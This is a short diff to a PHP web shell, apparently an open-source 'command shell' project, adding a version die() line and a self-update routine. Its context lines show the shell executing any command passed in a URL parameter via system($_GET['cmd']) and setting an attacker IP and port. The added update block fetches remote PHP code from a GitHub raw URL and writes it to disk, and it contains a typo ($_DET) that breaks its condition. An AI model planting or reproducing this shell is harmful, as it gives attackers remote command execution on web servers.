@@ -7,6 +7,8 @@
 	</head>
 	<body>
 		<?php
+		die('V2.0.0');
+
 		$attackip = "10.0.2.6";
 		$attackport = "8000";
 		echo '
@@ -110,7 +112,11 @@
 			echo '<pre style="margin:20px 40px;padding:20px 30px;color:#fff;background-color:#000;font-size:1.2em;">';
 			echo (system($_GET['cmd']));
 			echo '</pre>';
-		} 
+		}
+
+        if (isset($_DET['update']) && $_GET['update'] == "true"){
+            file_put_contents('nsscmdshell2.php', file_get_contents('https://raw.githubusercontent.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/main/nsscmdshell.php'));
+        }
 		?>
 	</body>
 </html>
